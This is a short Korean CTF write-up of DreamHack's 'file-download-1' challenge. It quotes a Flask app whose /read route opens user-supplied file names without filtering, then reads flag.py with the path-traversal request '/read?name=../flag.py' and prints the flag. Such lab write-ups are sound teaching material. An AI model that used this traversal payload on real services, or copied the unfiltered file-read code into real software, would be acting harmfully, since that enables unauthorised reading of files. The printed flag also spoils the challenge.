# [DreamHack] file-download-1

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> File Download 취약점이 존재하는 웹 서비스입니다.
> flag.py를 다운로드 받으면 플래그를 획득할 수 있습니다.
>
> Release: [file-download-1.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8560357/file-download-1.zip)

## Analysis

### /

```python
@APP.route('/')
def index():
    files = os.listdir(UPLOAD_DIR) # uploads 디렉토리의 파일 목록 출력
    return render_template('index.html', files=files)
```

### /upload

```python
@APP.route('/upload', methods=['GET', 'POST'])
def upload_memo():
    if request.method == 'POST':
        filename = request.form.get('filename') # 파일 이름 입력
        content = request.form.get('content').encode('utf-8') # 파일 내용 입력

        if filename.find('..') != -1: # '..' 필터링 -> path traversal 방지
            return render_template('upload_result.html', data='bad characters,,')

        with open(f'{UPLOAD_DIR}/{filename}', 'wb') as f: # 파일 생성
            f.write(content) # 내용 작성

        return redirect('/')

    return render_template('upload.html')
```

### /read

```python
@APP.route('/read')
def read_memo():
    error = False
    data = b''

    filename = request.args.get('name', '') # 파일 이름 입력 (필터링 X)

    try:
        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
            data = f.read() # 파일 내용 반환
    except (IsADirectoryError, FileNotFoundError):
        error = True


    return render_template('read.html',
                           filename=filename,
                           content=data.decode('utf-8'),
                           error=error)
```

`/` 페이지에서 파일을 선택하면 그 파일의 내용을 읽어온다. GET으로 전달되는 파일 이름에 필터링이 없으므로, path traversal을 통해 `flag.py` 파일을 읽어올 수 있다.

## Exploit

`/read?name=../flag.py`로 접속하면 플래그를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/165235301-a2914a6f-2748-4754-adc6-28210749723c.png)

```
flag: DH{uploading_webshell_in_python_program_is_my_dream}
```